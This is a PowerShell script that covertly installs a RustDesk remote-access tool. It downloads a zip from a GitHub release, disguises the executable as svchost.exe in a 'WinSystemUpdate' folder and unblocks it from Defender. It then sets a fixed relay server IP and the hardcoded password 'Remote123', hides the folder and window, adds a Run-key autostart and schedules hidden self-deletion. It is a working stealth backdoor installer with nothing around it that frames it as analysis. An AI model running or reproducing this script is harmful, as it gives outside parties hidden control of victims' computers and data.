function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\svchost.exe"
    $DLL    = "$DEST\sciter.dll"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $zipUrl = 'https://github.com/kk70226581/rd-files/releases/download/v1.0/update.zip'

    try {
        # 1. Kill old instances COMPLETELY
        Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
        Get-Process RuntimeBroker -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep 3

        # 2. Clean old folder COMPLETELY
        Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
        Start-Sleep 2
        
        New-Item -ItemType Directory $DEST -Force | Out-Null
        New-Item -ItemType Directory $cfgDir -Force | Out-Null

        # 3. Download ZIP with retry logic
        Write-Host "Installing..." -ForegroundColor Cyan
        $zipPath = "$env:TEMP\update_rd.zip"
        Remove-Item $zipPath -Force -EA SilentlyContinue
        
        # Try download with timeout
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($zipUrl, $zipPath)
        
        Start-Sleep 1

        if (!(Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 10MB) {
            Write-Host "Download failed or incomplete!" -ForegroundColor Red
            return
        }

        # 4. Extract ZIP - Unblock after extraction
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $z = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
        
        foreach ($entry in $z.Entries) {
            $targetPath = "$DEST\$($entry.Name)"
            
            if ($entry.Name -eq 'chrome.exe') {
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $EXE, $true)
            }
            elseif ($entry.Name -eq 'sciter.dll') {
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $DLL, $true)
            }
        }
        $z.Dispose()
        
        # CRITICAL: Unblock extracted files from Defender
        Start-Sleep 1
        Unblock-File -Path $EXE -EA SilentlyContinue
        Unblock-File -Path $DLL -EA SilentlyContinue
        
        Remove-Item $zipPath -Force -EA SilentlyContinue

        # Verify extraction worked
        if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 20MB) {
            Write-Host "Extraction failed!" -ForegroundColor Red
            return
        }

        # 5. Configure RustDesk
        @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

        @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

        # 6. Hide folder
        try { 
            $f = Get-Item $DEST -Force
            $f.Attributes = $f.Attributes -bor 2 -bor 4
        } catch {}

        # 7. Get ID silently
        $psiId = New-Object System.Diagnostics.ProcessStartInfo
        $psiId.FileName = $EXE
        $psiId.Arguments = '--get-id'
        $psiId.UseShellExecute = $false
        $psiId.RedirectStandardOutput = $true
        $psiId.CreateNoWindow = $true
        $psiId.WorkingDirectory = $DEST
        
        $prId = [System.Diagnostics.Process]::Start($psiId)
        $outT = $prId.StandardOutput.ReadToEndAsync()
        $prId.WaitForExit(8000) | Out-Null
        if ($prId.HasExited) { $prId.Dispose() }
        
        $RDID = $outT.Result.Trim()
        if ([string]::IsNullOrWhiteSpace($RDID)) { $RDID = "Error getting ID" }

        # 8. Start RustDesk hidden
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $EXE
        $psi.WorkingDirectory = $DEST
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        if ($proc) { $proc.Dispose() }
        
        Start-Sleep 3

        # 9. Force hide window if it appeared
        Add-Type -Name WH -Namespace NH -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
        Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { 
            [NH.WH]::ShowWindow($_.MainWindowHandle, 0) | Out-Null 
        }

        # 10. Autostart on boot
        Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' $EXE -Force

        # 11. Auto-delete after 1 hour or when stopped
        $del = "$DEST\delete.ps1"
        @'
`$d = "$DEST"
Get-Process svchost -EA SilentlyContinue | Where-Object { `$_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath `$d -Recurse -Force -EA SilentlyContinue
'@ | Set-Content $del -Encoding UTF8

        $watch = "$DEST\watch.ps1"
        @'
`$EXE = "$EXE"
`$del = "$del"
`$deadline = [DateTime]::Now.AddHours(1)
while ([DateTime]::Now -lt `$deadline) {
    Start-Sleep 10
    `$alive = Get-Process svchost -EA SilentlyContinue | Where-Object { `$_.Path -eq `$EXE }
    if (-not `$alive) { break }
}
if (Test-Path `$del) { & `$del }
'@ | Set-Content $watch -Encoding UTF8

        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""

        Write-Host ""
        Write-Host "  ============================" -ForegroundColor Green
        Write-Host "  ID       : $RDID" -ForegroundColor Cyan
        Write-Host "  Password : Remote123" -ForegroundColor Cyan
        Write-Host "  ============================" -ForegroundColor Green
        Write-Host ""
        
    } catch {
        Write-Host "ERROR: $_" -ForegroundColor Red
    }
}
Install-RD
